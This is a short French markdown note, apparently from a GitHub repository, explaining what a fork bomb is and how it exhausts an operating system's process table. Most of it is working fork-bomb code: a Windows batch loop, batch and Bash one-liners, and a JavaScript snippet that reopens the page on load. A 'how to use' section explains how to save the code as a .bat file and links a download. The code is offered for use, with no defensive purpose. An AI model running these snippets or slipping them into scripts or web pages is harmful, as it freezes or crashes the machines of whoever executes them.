# Fork bomb
La fork bomb est une forme d'attaque par déni de service contre un système informatique utilisant la fonction fork.  
Elle est basée sur la supposition que le nombre de programmes et de processus pouvant être exécutés simultanément sur un ordinateur est limité.

## Principe
Une fork bomb fonctionne en créant un grand nombre de processus très rapidement, au moyen de la fonction fork, afin de saturer l'espace disponible dans la liste des processus gardée par le système d'exploitation.  
Si la table des processus se met à saturer, aucun nouveau programme ne peut démarrer tant qu'aucun autre ne termine.  

Même si cela arrive, il est peu probable qu'un programme utile démarre étant donné que les instances de la bombe attendent chacune d'occuper cet emplacement libre.

# Code
```
@echo off
:start
start
goto :start
```
Source : [Github](#Télécharger-depuis-Github)

# Variante Windows (Batch)
```
%0|%0
```

# Variante Linux (Bash)
```
:(){ :|:& };:
```

# Variante HTML / JS
```
<script type="text/javascript">
  function open_target_blank() 
  {
    window.open(window.location);
  }
  window.onload = open_target_blank();
</script>
```

# Comment utiliser

## Créer le fichier
- Créer un fichier [NOM].bat
- Modifier le text du fichier avec le code suivant : [Code](#Code)
- Vérifier que vous enregistrez bien le type de fichier en "Tout type de fichier" et non pas text uniquement
![notepad_hreGWL4UXj](https://github.com/Altherneum/.github/assets/84735589/940ea3b0-9e4b-4668-9af0-2eecbf35db47)

## Télécharger depuis Github
- [github.com /Altherneum/.github /blob/main /note /OS/Windows /matrice.bat](https://github.com/Altherneum/.github/blob/main/note/OS/Windows/matrice.bat)